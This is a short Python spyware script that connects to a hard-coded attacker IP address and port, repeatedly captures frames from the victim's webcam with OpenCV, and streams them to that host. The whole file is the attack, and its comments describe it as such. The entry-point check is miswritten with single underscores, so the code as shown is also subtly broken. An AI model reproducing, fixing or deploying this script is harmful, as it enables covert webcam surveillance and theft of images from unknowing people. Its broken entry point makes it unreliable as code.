import cv2
import socket
import os

# Connect to attacker's machine
def connect_to_attacker():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('154.161.54.98', 8080))  # Attacker's IP address and port
    return s

# Capture screenshot from the webcam
def capture_webcam():
    webcam = cv2.VideoCapture(0)
    ret, frame = webcam.read()
    webcam.release()
    if ret:
        return frame
    else:
        return None

# Send captured screenshot to the attacker
def send_screenshot(s, screenshot):
    encoded_image = cv2.imencode('.jpg', screenshot)[1].tobytes()
    s.sendall(encoded_image)

# Main function
def main():
    connection = connect_to_attacker()
    while True:
        screenshot = capture_webcam()
        if screenshot is not None:
            send_screenshot(connection, screenshot)

if _name_ == '_main_':
    main()